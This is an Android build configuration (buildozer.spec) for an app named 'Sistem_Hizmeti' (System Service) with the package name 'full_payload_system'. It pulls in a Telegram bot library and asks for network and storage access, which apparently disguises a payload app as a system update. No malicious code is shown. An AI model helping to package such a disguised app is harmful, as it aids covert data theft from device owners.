[app]
title = Sistem_Hizmeti
package.name = full_payload_system
package.domain = org.service.update
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0
requirements = python3,kivy,pyTelegramBotAPI,requests,certifi,idna,urllib3,charset-normalizer
orientation = portrait
android.archs = arm64-v8a, armeabi-v7a
android.allow_backup = True
android.api = 31
android.minapi = 21
android.accept_sdk_license = True
android.permissions = INTERNET, ACCESS_NETWORK_STATE, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE

[buildozer]
log_level = 2
warn_on_root = 1